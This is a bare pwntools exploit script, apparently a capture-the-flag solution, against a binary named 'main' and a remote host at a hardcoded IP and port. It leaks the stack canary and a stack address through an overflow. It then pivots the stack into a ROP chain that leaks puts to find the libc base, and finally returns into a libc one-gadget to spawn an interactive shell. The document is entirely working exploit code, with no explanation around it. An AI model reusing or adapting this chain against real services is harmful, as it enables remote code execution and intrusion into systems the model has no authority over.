from pwn import*
context.log_level ='DEBUG'
p = process('./main')
p = remote('121.36.59.116',9999)
elf =ELF('./main')
libc =ELF('./libc-2.23.so')
pop_rdi_ret = 0x0000000000400923
leave_ret = 0x0000000000400879
payload = 'U'*0x55 + 'FMYY'
p.sendafter('>',payload)
p.recvuntil('FMYY')
canary = u64(p.recv(7).rjust(8,'\x00'))
stack = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00'))
log.info('Canary:\t' + hex(canary))
log.info('Stack:\t' + hex(stack))
payload = p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(elf.sym['main'])
payload = payload.ljust(0x58,'\x00')
payload += p64(canary) + p64(stack - 0x78) + p64(leave_ret)
p.sendafter('>',payload)
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - libc.sym['puts']
log.info('LIBC:\t' + hex(libc_base))
system = libc.sym['system'] + libc_base
binsh = libc.search('/bin/sh').next() + libc_base
rce = libc_base + 0x4526A
p.sendafter('>','FMYY')
payload = 'U'*0x58 + p64(canary) + 'U'*0x8 + p64(rce)
p.sendafter('>',payload)
p.interactive()
